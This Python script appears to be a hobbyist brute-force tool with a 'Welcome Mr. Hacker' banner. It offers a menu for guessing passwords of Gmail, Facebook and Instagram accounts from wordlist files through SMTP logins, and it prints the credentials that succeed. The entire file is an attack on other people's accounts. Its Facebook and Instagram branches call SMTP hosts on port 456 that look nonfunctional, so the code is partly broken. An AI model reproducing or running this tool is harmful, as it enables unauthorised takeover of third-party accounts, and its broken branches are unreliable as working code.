import smtplib
from time import sleep
from colorama import Fore, Style

class GmailBruteForce:
    def __init__(self):
        self.accounts = []
        self.passwords = []

    def get_acc_list(self, path):
        with open(path, 'r', encoding='utf8') as file:
            self.accounts = file.read().splitlines()

    def get_pass_list(self, path):
        with open(path, 'r', encoding='utf8') as file:
            self.passwords = file.read().splitlines()

    def try_gmail(self):
        for user in self.accounts:
            for password in self.passwords:
                try:
                    smtp = smtplib.SMTP("smtp.gmail.com", 587)
                    smtp.starttls()
                    smtp.ehlo()
                    smtp.login(user, password)
                    sleep(3)
                    print(Fore.GREEN + f"Success! User: {user}, Password: {password}" + Style.RESET_ALL)
                    smtp.quit()
                    break
                except:
                    sleep(3)
                    print(Fore.RED + f"Failed! User: {user}, Password: {password}" + Style.RESET_ALL)

class FacebookBruteForce:
    def __init__(self):
        self.accounts = []
        self.passwords = []

    def get_acc_list(self, path):
        with open(path, 'r', encoding='utf8') as file:
            self.accounts = file.read().splitlines()

    def get_pass_list(self, path):
        with open(path, 'r', encoding='utf8') as file:
            self.passwords = file.read().splitlines()

    def try_facebook(self):
        for user in self.accounts:
            for password in self.passwords:
                try:
                    smtp = smtplib.SMTP("smtp.facebook.com", 456)
                    smtp.starttls()
                    smtp.ehlo()
                    smtp.login(user, password)
                    sleep(3)
                    print(Fore.GREEN + f"Success! User: {user}, Password: {password}" + Style.RESET_ALL)
                    smtp.quit()
                    break
                except:
                    sleep(3)
                    print(Fore.RED + f"Failed! User: {user}, Password: {password}" + Style.RESET_ALL)

class InstagramBruteForce:
    def __init__(self):
        self.accounts = []
        self.passwords = []

    def get_acc_list(self, path):
        with open(path, 'r', encoding='utf8') as file:
            self.accounts = file.read().splitlines()

    def get_pass_list(self, path):
        with open(path, 'r', encoding='utf8') as file:
            self.passwords = file.read().splitlines()

    def try_instagram(self):
        for user in self.accounts:
            for password in self.passwords:
                try:
                    smtp = smtplib.SMTP("smtp.instagram.com", 456)
                    smtp.starttls()
                    smtp.ehlo()
                    smtp.login(user, password)
                    sleep(3)
                    print(Fore.GREEN + f"Success! User: {user}, Password: {password}" + Style.RESET_ALL)
                    smtp.quit()
                    break
                except:
                    sleep(3)
                    print(Fore.RED + f"Failed! User: {user}, Password: {password}" + Style.RESET_ALL)

print(Fore.YELLOW + '''
        /$$$$$$
       /$$__  $$
      | $$  \__//$$   /$$
      |  $$$$$$|  $$ /$$/
       \____  $$\  $$$$/
       /$$  \ $$ >$$  $$
      |  $$$$$$/\$$/\$$
       \______/  \__/
       
   [Brute Force Options]
  -----------------------
  instagram: mhagne_mhomd
    Welcome Mr. Hacker
  -----------------------
''' + Style.RESET_ALL)
do = input('''
    Choose any number ?
    1 - Target Gmail
    2 - Facebook
    3 - instagram
    ==> ''')

if do == '1':
    user = input(Fore.CYAN + "List Of Emails => " + Style.RESET_ALL)
    passfile = input(Fore.CYAN + "Path to Password File => " + Style.RESET_ALL)

    instance = GmailBruteForce()
    instance.get_acc_list(user)
    instance.get_pass_list(passfile)
    instance.try_gmail()

elif do == '2':
    user = input(Fore.CYAN + "List Of Facebook => " + Style.RESET_ALL)
    passfile = input(Fore.CYAN + "Path to Password File => " + Style.RESET_ALL)

    instance = FacebookBruteForce()
    instance.get_acc_list(user)
    instance.get_pass_list(passfile)
    instance.try_facebook()

elif do == '3':
    user = input(Fore.CYAN + "List Of instagram => " + Style.RESET_ALL)
    passfile = input(Fore.CYAN + "Path to Password File => " + Style.RESET_ALL)

    instance = InstagramBruteForce()
    instance.get_acc_list(user)
    instance.get_pass_list(passfile)
    instance.try_instagram()
